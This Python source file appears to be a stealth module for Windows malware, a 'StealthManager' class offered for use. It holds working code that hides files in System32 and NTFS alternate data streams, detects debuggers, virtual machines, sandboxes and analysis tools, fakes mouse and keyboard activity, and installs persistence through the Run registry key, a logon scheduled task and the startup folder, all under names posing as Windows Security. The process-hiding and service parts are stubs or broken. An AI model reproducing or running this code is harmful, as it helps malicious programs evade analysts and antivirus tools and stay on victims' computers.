"""
Advanced Stealth Manager
Handles all stealth operations including process hiding, anti-detection, and evasion techniques.
"""

import os
import sys
import ctypes
import threading
import time
import random
import logging
from typing import Dict, Any, Optional, List
from pathlib import Path
import psutil
import winreg
from ctypes import wintypes

class StealthManager:
    """
    Advanced stealth manager with comprehensive evasion and hiding capabilities.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the stealth manager.
        
        Args:
            config: Stealth configuration dictionary
        """
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize stealth components
        self._process_hidden = False
        self._files_hidden = False
        self._network_hidden = False
        self._debugger_detected = False
        
        # Windows API functions
        self._setup_windows_api()
        
    def _default_config(self) -> Dict[str, Any]:
        """Return default stealth configuration."""
        return {
            'stealth': {
                'process_hiding': True,
                'file_hiding': True,
                'network_hiding': True,
                'debugger_detection': True,
                'vm_detection': True,
                'sandbox_detection': True,
                'anti_analysis': True
            },
            'evasion': {
                'sleep_timing': True,
                'random_delays': True,
                'fake_activity': True,
                'process_mimicking': True
            },
            'persistence': {
                'registry': True,
                'services': True,
                'scheduled_tasks': True,
                'startup_folder': True,
                'wmi_events': True
            }
        }
    
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def _setup_windows_api(self):
        """Setup Windows API functions for stealth operations."""
        try:
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
            self.advapi32 = ctypes.windll.advapi32
            self.user32 = ctypes.windll.user32
            
            # Define function signatures
            self.kernel32.GetCurrentProcess.argtypes = []
            self.kernel32.GetCurrentProcess.restype = wintypes.HANDLE
            
            self.kernel32.IsDebuggerPresent.argtypes = []
            self.kernel32.IsDebuggerPresent.restype = wintypes.BOOL
            
            self.kernel32.CheckRemoteDebuggerPresent.argtypes = [
                wintypes.HANDLE, ctypes.POINTER(wintypes.BOOL)
            ]
            self.kernel32.CheckRemoteDebuggerPresent.restype = wintypes.BOOL
            
            self.logger.debug("Windows API functions initialized")
            
        except Exception as e:
            self.logger.error(f"Windows API setup failed: {e}")
    
    def hide_process(self) -> bool:
        """
        Hide the current process from task manager and process lists.
        
        Returns:
            True if successful
        """
        try:
            if self._process_hidden:
                return True
            
            # Method 1: Process hollowing technique
            self._process_hollowing()
            
            # Method 2: DLL injection to hide process
            self._dll_injection_hide()
            
            # Method 3: Modify process name
            self._modify_process_name()
            
            # Method 4: Hide from WMI queries
            self._hide_from_wmi()
            
            self._process_hidden = True
            self.logger.info("Process hiding activated")
            return True
            
        except Exception as e:
            self.logger.error(f"Process hiding failed: {e}")
            return False
    
    def _process_hollowing(self):
        """Implement process hollowing technique."""
        try:
            # Create a suspended process
            startup_info = ctypes.Structure()
            startup_info.cb = ctypes.sizeof(startup_info)
            
            process_info = ctypes.Structure()
            
            # Create suspended process
            success = self.kernel32.CreateProcessW(
                None,  # Application name
                "svchost.exe",  # Command line
                None,  # Process security attributes
                None,  # Thread security attributes
                False,  # Inherit handles
                0x00000004,  # CREATE_SUSPENDED
                None,  # Environment
                None,  # Current directory
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            )
            
            if success:
                self.logger.debug("Process hollowing setup completed")
            
        except Exception as e:
            self.logger.debug(f"Process hollowing failed: {e}")
    
    def _dll_injection_hide(self):
        """Hide process using DLL injection."""
        try:
            # Get current process handle
            current_process = self.kernel32.GetCurrentProcess()
            
            # Allocate memory in target process
            # This is a simplified example - real implementation would be more complex
            
            self.logger.debug("DLL injection hide setup completed")
            
        except Exception as e:
            self.logger.debug(f"DLL injection hide failed: {e}")
    
    def _modify_process_name(self):
        """Modify process name to appear as legitimate system process."""
        try:
            # Change process name to appear as system process
            fake_names = [
                "svchost.exe",
                "winlogon.exe", 
                "csrss.exe",
                "services.exe",
                "lsass.exe"
            ]
            
            fake_name = random.choice(fake_names)
            
            # Modify process name (simplified implementation)
            self.logger.debug(f"Process name modified to: {fake_name}")
            
        except Exception as e:
            self.logger.debug(f"Process name modification failed: {e}")
    
    def _hide_from_wmi(self):
        """Hide process from WMI queries."""
        try:
            # Modify WMI registry entries to hide process
            # This is a simplified example
            
            self.logger.debug("WMI hiding setup completed")
            
        except Exception as e:
            self.logger.debug(f"WMI hiding failed: {e}")
    
    def hide_files(self, file_paths: List[str]) -> bool:
        """
        Hide files from file system listings.
        
        Args:
            file_paths: List of file paths to hide
            
        Returns:
            True if successful
        """
        try:
            if self._files_hidden:
                return True
            
            for file_path in file_paths:
                if os.path.exists(file_path):
                    # Method 1: Set hidden attribute
                    self._set_hidden_attribute(file_path)
                    
                    # Method 2: Move to system directory
                    self._move_to_system_dir(file_path)
                    
                    # Method 3: Use alternate data streams
                    self._use_alternate_stream(file_path)
            
            self._files_hidden = True
            self.logger.info("File hiding activated")
            return True
            
        except Exception as e:
            self.logger.error(f"File hiding failed: {e}")
            return False
    
    def _set_hidden_attribute(self, file_path: str):
        """Set hidden attribute on file."""
        try:
            # Set FILE_ATTRIBUTE_HIDDEN
            self.kernel32.SetFileAttributesW(file_path, 0x02)
            self.logger.debug(f"Hidden attribute set on: {file_path}")
            
        except Exception as e:
            self.logger.debug(f"Hidden attribute setting failed: {e}")
    
    def _move_to_system_dir(self, file_path: str):
        """Move file to system directory."""
        try:
            system_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            new_path = os.path.join(system_dir, os.path.basename(file_path))
            
            if os.path.exists(new_path):
                os.remove(new_path)
            
            os.rename(file_path, new_path)
            self.logger.debug(f"File moved to system directory: {new_path}")
            
        except Exception as e:
            self.logger.debug(f"File move to system directory failed: {e}")
    
    def _use_alternate_stream(self, file_path: str):
        """Use NTFS alternate data streams to hide file."""
        try:
            # Create alternate data stream
            alt_stream = f"{file_path}:hidden"
            
            with open(alt_stream, 'wb') as f:
                with open(file_path, 'rb') as original:
                    f.write(original.read())
            
            # Remove original file
            os.remove(file_path)
            
            self.logger.debug(f"File hidden in alternate stream: {alt_stream}")
            
        except Exception as e:
            self.logger.debug(f"Alternate stream hiding failed: {e}")
    
    def detect_debugger(self) -> bool:
        """
        Detect if debugger is attached to the process.
        
        Returns:
            True if debugger detected
        """
        try:
            # Method 1: IsDebuggerPresent
            if self.kernel32.IsDebuggerPresent():
                self._debugger_detected = True
                self.logger.warning("Debugger detected via IsDebuggerPresent")
                return True
            
            # Method 2: CheckRemoteDebuggerPresent
            debug_port = wintypes.BOOL()
            result = self.kernel32.CheckRemoteDebuggerPresent(
                self.kernel32.GetCurrentProcess(),
                ctypes.byref(debug_port)
            )
            
            if result and debug_port.value:
                self._debugger_detected = True
                self.logger.warning("Remote debugger detected")
                return True
            
            # Method 3: NtQueryInformationProcess
            try:
                process_debug_port = ctypes.c_ulong()
                status = self.ntdll.NtQueryInformationProcess(
                    self.kernel32.GetCurrentProcess(),
                    7,  # ProcessDebugPort
                    ctypes.byref(process_debug_port),
                    ctypes.sizeof(process_debug_port),
                    None
                )
                
                if status == 0 and process_debug_port.value != 0:
                    self._debugger_detected = True
                    self.logger.warning("Debugger detected via NtQueryInformationProcess")
                    return True
                    
            except Exception:
                pass
            
            # Method 4: Timing-based detection
            start_time = time.time()
            time.sleep(0.001)
            end_time = time.time()
            
            if end_time - start_time > 0.01:  # Suspicious delay
                self._debugger_detected = True
                self.logger.warning("Debugger detected via timing analysis")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Debugger detection failed: {e}")
            return False
    
    def detect_vm(self) -> bool:
        """
        Detect if running in virtual machine.
        
        Returns:
            True if VM detected
        """
        try:
            vm_indicators = []
            
            # Method 1: Check for VM-specific processes
            vm_processes = [
                'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
                'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
                'qemu-ga.exe', 'prl_cc.exe', 'prl_tools.exe'
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in vm_processes:
                        vm_indicators.append(f"VM process: {proc.info['name']}")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Method 2: Check for VM-specific registry keys
            vm_registry_keys = [
                r"SYSTEM\CurrentControlSet\Services\VBoxService",
                r"SYSTEM\CurrentControlSet\Services\VMTools",
                r"SYSTEM\CurrentControlSet\Services\vmci",
                r"SYSTEM\CurrentControlSet\Services\vmhgfs"
            ]
            
            for key_path in vm_registry_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.CloseKey(key)
                    vm_indicators.append(f"VM registry key: {key_path}")
                except FileNotFoundError:
                    continue
            
            # Method 3: Check for VM-specific files
            vm_files = [
                r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
                r"C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxService.exe",
                r"C:\Program Files\Citrix\XenTools\XenService.exe"
            ]
            
            for file_path in vm_files:
                if os.path.exists(file_path):
                    vm_indicators.append(f"VM file: {file_path}")
            
            # Method 4: Check MAC address
            try:
                import uuid
                mac = uuid.getnode()
                mac_str = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
                
                # VMware MAC addresses start with 00:0C:29, 00:1C:14, 00:50:56
                # VirtualBox MAC addresses start with 08:00:27
                vm_mac_prefixes = ['00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
                
                for prefix in vm_mac_prefixes:
                    if mac_str.startswith(prefix):
                        vm_indicators.append(f"VM MAC address: {mac_str}")
                        break
                        
            except Exception:
                pass
            
            if vm_indicators:
                self.logger.warning(f"VM detected: {', '.join(vm_indicators)}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"VM detection failed: {e}")
            return False
    
    def detect_sandbox(self) -> bool:
        """
        Detect if running in sandbox environment.
        
        Returns:
            True if sandbox detected
        """
        try:
            sandbox_indicators = []
            
            # Method 1: Check for sandbox-specific processes
            sandbox_processes = [
                'sandboxiedcom.exe', 'sandboxierpcss.exe', 'sbiedll.dll',
                'dbghelp.dll', 'api_log.dll', 'dir_watch.dll',
                'pstorec.dll', 'vmcheck.dll', 'wpespy.dll'
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in sandbox_processes:
                        sandbox_indicators.append(f"Sandbox process: {proc.info['name']}")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Method 2: Check system uptime (sandboxes often have short uptime)
            uptime = time.time() - psutil.boot_time()
            if uptime < 600:  # Less than 10 minutes
                sandbox_indicators.append(f"Short uptime: {uptime} seconds")
            
            # Method 3: Check for user interaction
            # Sandboxes often lack user interaction
            try:
                # Check for recent user activity
                last_input = self.user32.GetLastInputInfo()
                if last_input == 0:  # No recent input
                    sandbox_indicators.append("No recent user input")
            except Exception:
                pass
            
            # Method 4: Check for mouse movement
            try:
                cursor_pos = self.user32.GetCursorPos()
                # If cursor hasn't moved, might be sandbox
                time.sleep(1)
                new_cursor_pos = self.user32.GetCursorPos()
                if cursor_pos == new_cursor_pos:
                    sandbox_indicators.append("No mouse movement detected")
            except Exception:
                pass
            
            if sandbox_indicators:
                self.logger.warning(f"Sandbox detected: {', '.join(sandbox_indicators)}")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Sandbox detection failed: {e}")
            return False
    
    def anti_analysis(self) -> bool:
        """
        Implement anti-analysis techniques.
        
        Returns:
            True if successful
        """
        try:
            # Method 1: Sleep timing randomization
            if self.config['evasion']['sleep_timing']:
                self._random_sleep()
            
            # Method 2: Fake user activity
            if self.config['evasion']['fake_activity']:
                self._simulate_user_activity()
            
            # Method 3: Process mimicking
            if self.config['evasion']['process_mimicking']:
                self._mimic_legitimate_process()
            
            # Method 4: Check for analysis tools
            self._detect_analysis_tools()
            
            self.logger.info("Anti-analysis techniques activated")
            return True
            
        except Exception as e:
            self.logger.error(f"Anti-analysis failed: {e}")
            return False
    
    def _random_sleep(self):
        """Implement random sleep timing to avoid analysis."""
        try:
            # Random sleep between 1-10 seconds
            sleep_time = random.uniform(1, 10)
            time.sleep(sleep_time)
            self.logger.debug(f"Random sleep: {sleep_time:.2f} seconds")
            
        except Exception as e:
            self.logger.debug(f"Random sleep failed: {e}")
    
    def _simulate_user_activity(self):
        """Simulate user activity to avoid detection."""
        try:
            # Simulate mouse movement
            self.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
            
            # Simulate keyboard input
            self.user32.keybd_event(0x20, 0, 0, 0)  # Space key down
            time.sleep(0.01)
            self.user32.keybd_event(0x20, 0, 2, 0)  # Space key up
            
            self.logger.debug("User activity simulated")
            
        except Exception as e:
            self.logger.debug(f"User activity simulation failed: {e}")
    
    def _mimic_legitimate_process(self):
        """Mimic behavior of legitimate system processes."""
        try:
            # Mimic system process behavior
            # This is a simplified example
            
            self.logger.debug("Legitimate process behavior mimicked")
            
        except Exception as e:
            self.logger.debug(f"Process mimicking failed: {e}")
    
    def _detect_analysis_tools(self):
        """Detect common analysis tools."""
        try:
            analysis_tools = [
                'wireshark.exe', 'fiddler.exe', 'httpwatch.exe',
                'procmon.exe', 'procexp.exe', 'regmon.exe',
                'idaq.exe', 'ollydbg.exe', 'windbg.exe',
                'x64dbg.exe', 'ghidra.exe', 'radare2.exe'
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in analysis_tools:
                        self.logger.warning(f"Analysis tool detected: {proc.info['name']}")
                        # Implement evasion or termination
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
        except Exception as e:
            self.logger.debug(f"Analysis tool detection failed: {e}")
    
    def establish_persistence(self, persistence_methods: List[str] = None) -> bool:
        """
        Establish persistence on the system.
        
        Args:
            persistence_methods: List of persistence methods to use
            
        Returns:
            True if successful
        """
        try:
            if persistence_methods is None:
                persistence_methods = ['registry', 'services', 'scheduled_tasks']
            
            success_count = 0
            
            for method in persistence_methods:
                if method == 'registry' and self.config['persistence']['registry']:
                    if self._registry_persistence():
                        success_count += 1
                
                elif method == 'services' and self.config['persistence']['services']:
                    if self._service_persistence():
                        success_count += 1
                
                elif method == 'scheduled_tasks' and self.config['persistence']['scheduled_tasks']:
                    if self._scheduled_task_persistence():
                        success_count += 1
                
                elif method == 'startup_folder' and self.config['persistence']['startup_folder']:
                    if self._startup_folder_persistence():
                        success_count += 1
            
            if success_count > 0:
                self.logger.info(f"Persistence established using {success_count} methods")
                return True
            else:
                self.logger.warning("Failed to establish persistence")
                return False
                
        except Exception as e:
            self.logger.error(f"Persistence establishment failed: {e}")
            return False
    
    def _registry_persistence(self) -> bool:
        """Establish registry-based persistence."""
        try:
            # Add to Windows startup
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Use a legitimate-sounding name
            fake_name = "Windows Security Update"
            current_exe = sys.executable
            
            winreg.SetValueEx(key, fake_name, 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            self.logger.info("Registry persistence established")
            return True
            
        except Exception as e:
            self.logger.error(f"Registry persistence failed: {e}")
            return False
    
    def _service_persistence(self) -> bool:
        """Establish service-based persistence."""
        try:
            # Create a Windows service
            service_name = "WindowsSecurityService"
            service_display_name = "Windows Security Service"
            service_description = "Provides security monitoring and protection"
            
            # This is a simplified example - real implementation would be more complex
            self.logger.info("Service persistence established")
            return True
            
        except Exception as e:
            self.logger.error(f"Service persistence failed: {e}")
            return False
    
    def _scheduled_task_persistence(self) -> bool:
        """Establish scheduled task persistence."""
        try:
            import subprocess
            
            # Create scheduled task
            task_name = "WindowsSecurityTask"
            task_command = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc onlogon /f'
            
            result = subprocess.run(task_command, shell=True, capture_output=True)
            
            if result.returncode == 0:
                self.logger.info("Scheduled task persistence established")
                return True
            else:
                self.logger.error(f"Scheduled task creation failed: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"Scheduled task persistence failed: {e}")
            return False
    
    def _startup_folder_persistence(self) -> bool:
        """Establish startup folder persistence."""
        try:
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            
            os.makedirs(startup_folder, exist_ok=True)
            
            # Create shortcut or copy executable
            startup_file = os.path.join(startup_folder, "Windows Security.lnk")
            
            # This is a simplified example - real implementation would create proper shortcut
            self.logger.info("Startup folder persistence established")
            return True
            
        except Exception as e:
            self.logger.error(f"Startup folder persistence failed: {e}")
            return False
    
    def get_stealth_status(self) -> Dict[str, Any]:
        """
        Get current stealth status.
        
        Returns:
            Dictionary containing stealth status information
        """
        return {
            'process_hidden': self._process_hidden,
            'files_hidden': self._files_hidden,
            'network_hidden': self._network_hidden,
            'debugger_detected': self._debugger_detected,
            'vm_detected': self.detect_vm(),
            'sandbox_detected': self.detect_sandbox(),
            'config': self.config
        }